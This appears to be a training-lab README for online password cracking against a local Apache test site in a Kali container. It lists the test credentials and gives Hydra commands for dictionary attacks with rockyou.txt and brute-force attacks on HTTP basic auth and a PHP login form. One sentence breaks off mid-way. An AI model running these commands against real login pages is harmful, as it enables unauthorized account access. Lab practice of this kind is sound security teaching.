# Online cracking

Log into kali container, run 'service apache2 start' to bring up the local test site.
User and pass for both localhost/form/ and localhost/basic/ is "admin" with password "secret1".
- Apache http basic auth
- php flat config
- Bonus; determine valid user for php form through timing attack

## Hydra syntax
The -l option specifies a single user name. To take user names from a 

### Dictionary attack
```
hydra -l "admin" -P /usr/share/wordlists/rockyou.txt localhost http-get /basic
```
### Brute force generation attack
Hydra does not allow you to generate very large password lists. It automatically stops with an error if your brute force generator specification would result in more than 4 billion passwords. This is done since it is typically not feasible to perform such an attack over the network.
```
hydra -l "admin" -x 6:8:a1 localhost http-get /basic
```

See /var/log/apache2/error.log. Http basic/digest failed logins are very noisy in the apache error log.

hydra -l "admin" -P /usr/share/wordlists/rockyou.txt localhost http-form-post "/form/index.php:username=^USER^&password=^PASS^:Login failed"

# Run apache in docker so it can be accessed from the host OS
You may wish to try some external tools or look at pages in your browser, to do so you can run apache in the docker container and bind it to port 8000 on localhost;

docker run -d -p 8000:80 ros-demos/kali-linux-docker /usr/sbin/apache2ctl -D FOREGROUND

You should be able to access the sites on http://localhost:8000/ now.
(Use 'docker ps' and 'docker stop' to shut down the apache server after you are done.)

secret1